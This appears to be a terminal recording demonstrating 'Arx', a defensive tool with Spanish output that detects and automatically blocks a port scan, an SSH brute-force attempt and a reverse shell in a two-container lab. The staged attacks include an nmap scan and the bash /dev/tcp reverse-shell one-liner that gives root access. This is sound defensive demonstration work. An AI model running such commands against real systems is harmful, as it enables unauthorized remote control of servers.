[0.0, "o", "\r\n"]
[0.002, "o", "\r\n\u001b[1;36mArx · three real attacks, two isolated containers. Arx's CLI currently speaks Spanish.\u001b[0m\r\n"]
[2.012, "o", "\r\n\u001b[1;36m1/3  Port scan\u001b[0m\r\n"]
[4.024, "o", "\u001b[31mattacker$\u001b[0m nmap -sS -p 9000-9020 victim\r\n"]
[4.209, "o", "9001/tcp open   tor-orport\r\n9002/tcp open   dynamid\r\n9003/tcp open   unknown\r\n"]
[6.22, "o", "\u001b[32marx$\u001b[0m arx guard --once --enforce\r\n"]
[6.46, "o", "  [high] escaneo desde 172.18.0.3 (≥8 puertos en 10 min, pista kernel)\r\n         → Tier 1: IP 172.18.0.3 bloqueada en nftables (timeout nativo 60 min + reversión de Arx)\r\n"]
[8.492, "o", "\u001b[31mattacker$\u001b[0m curl --max-time 4 http://victim:9001/\r\n"]
[10.992, "o", "\u001b[1mtimed out: the attacker lost all access to the server\u001b[0m\r\n"]
[13.002, "o", "\u001b[2m[lab] fast-forward 61 min: Arx undoes its own block\u001b[0m\r\n"]
[15.146, "o", "\r\n\u001b[1;36m2/3  SSH brute force\u001b[0m\r\n"]
[17.155, "o", "\u001b[31mattacker$\u001b[0m 8 wrong SSH passwords for root@victim\r\n"]
[19.655, "o", "\u001b[32marx$\u001b[0m arx guard --once --enforce\r\n"]
[19.918, "o", "  [high] 8 fallos de autenticación desde 172.18.0.3 (usuario más probado: root)\r\n         → Tier 1: IP 172.18.0.3 bloqueada en nftables (timeout nativo 60 min + reversión de Arx)\r\n"]
[21.95, "o", "\u001b[2m[lab] fast-forward 61 min: Arx undoes its own block\u001b[0m\r\n"]
[24.123, "o", "\r\n\u001b[1;36m3/3  Reverse shell, the classic one-liner\u001b[0m\r\n"]
[26.132, "o", "\u001b[33mvictim$\u001b[0m bash -i >& /dev/tcp/attacker/4444 0>&1\r\n"]
[27.248, "o", "\u001b[31mattacker$\u001b[0m (through the shell) id > /tmp/proof-1\r\n"]
[29.359, "o", "\u001b[33mvictim$\u001b[0m cat /tmp/proof-1\r\n"]
[29.424, "o", "uid=0(root) gid=0(root) groups=0(root)\r\n"]
[29.466, "o", "\u001b[2mThe attacker is running commands as root on the server.\u001b[0m\r\n"]
[31.476, "o", "\u001b[32marx$\u001b[0m arx guard --once --enforce\r\n"]
[31.718, "o", "  [crit] shell con conexión saliente: /usr/bin/bash → 172.18.0.3:4444 (pid 4012)\r\n         → Tier 1: canal C2 cortado en nftables (172.18.0.3:4444) · proceso dueño suspendido (1 pid) — se deshace solo en 60 min\r\n"]
[33.75, "o", "\u001b[31mattacker$\u001b[0m (through the shell) id > /tmp/proof-2\r\n"]
[36.25, "o", "\u001b[33mvictim$\u001b[0m cat /tmp/proof-2\r\n"]
[36.354, "o", "\u001b[1mNo such file: the command never arrived\u001b[0m\r\n"]
[38.363, "o", "\r\n\u001b[1;36mEvery automatic action above undoes itself after 60 minutes.\u001b[0m\r\n"]
[40.372, "o", "\u001b[1;36mDon't trust this recording. Run it yourself: bash lab/demo.sh\u001b[0m\r\n"]
